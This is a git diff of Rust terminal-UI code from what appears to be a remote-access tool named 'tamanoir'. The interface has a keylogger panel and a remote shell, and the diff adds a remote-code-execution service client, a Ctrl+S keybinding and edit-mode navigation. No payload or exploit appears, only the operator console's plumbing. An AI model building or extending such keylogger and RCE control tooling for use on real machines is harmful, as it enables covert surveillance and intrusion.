@@ -16,7 +16,7 @@ use shell::{Shell, ShellCommandHistory};
 
 use crate::{
     app::{AppResult, SessionsMap},
-    grpc::{RemoteShellServiceClient, SessionServiceClient},
+    grpc::{RceServiceClient, RemoteShellServiceClient, SessionServiceClient},
     tamanoir_grpc::SessionResponse,
 };
 
@@ -38,14 +38,20 @@ pub struct Sections {
 }
 
 impl Sections {
-    pub fn new(shell_history: ShellCommandHistory, sessions: SessionsMap) -> Self {
-        Self {
+    pub async fn new(
+        shell_history: ShellCommandHistory,
+        sessions: SessionsMap,
+        session_client: &mut SessionServiceClient,
+        rce_client: &mut RceServiceClient,
+    ) -> AppResult<Self> {
+        Ok(Self {
             focused_section: FocusedSection::Sessions,
             shell_section: Shell::new(shell_history),
             keylogger_section: keylogger::KeyLoggerSection::new(),
-            session_section: session::SessionSection::new(sessions),
+            session_section: session::SessionSection::new(sessions, session_client, rce_client)
+                .await?,
             shell_percentage_split: None,
-        }
+        })
     }
 
     fn render_footer_help(&self, frame: &mut Frame, block: Rect) {
@@ -54,7 +60,7 @@ impl Sections {
                 Span::from(" ").bold(),
                 Span::from(" Nav"),
                 Span::from(" | "),
-                Span::from("󰘶 + s:").bold(),
+                Span::from("Ctrl + s:").bold(),
                 Span::from(" (De)Activate Shell"),
             ];
 
@@ -218,7 +224,7 @@ impl Sections {
                 }
                 _ => {}
             },
-            KeyCode::Char('S') if key_event.modifiers == KeyModifiers::SHIFT => {
+            KeyCode::Char('s') if key_event.modifiers == KeyModifiers::CONTROL => {
                 if self.shell_percentage_split.is_some() {
                     self.shell_percentage_split = None;
                     if self.focused_section == FocusedSection::Shell {
@@ -248,8 +254,16 @@ impl Sections {
 
             _ => match self.focused_section {
                 FocusedSection::Sessions => match key_event.code {
-                    KeyCode::Char('j') | KeyCode::Down => self.session_section.next_row(),
-                    KeyCode::Char('k') | KeyCode::Up => self.session_section.previous_row(),
+                    KeyCode::Char('j') | KeyCode::Down => self.session_section.next_item(),
+                    KeyCode::Char('k') | KeyCode::Up => self.session_section.previous_item(),
+                    KeyCode::Char('e') => {
+                        self.session_section.edit_mode = !self.session_section.edit_mode;
+                    }
+                    KeyCode::Char('h') | KeyCode::Left => {
+                        self.session_section.previous_edit_section()
+                    }
+                    KeyCode::Char('l') | KeyCode::Right => self.session_section.next_edit_section(),
+
                     _ => {}
                 },
                 FocusedSection::KeyLogger => match key_event.code {
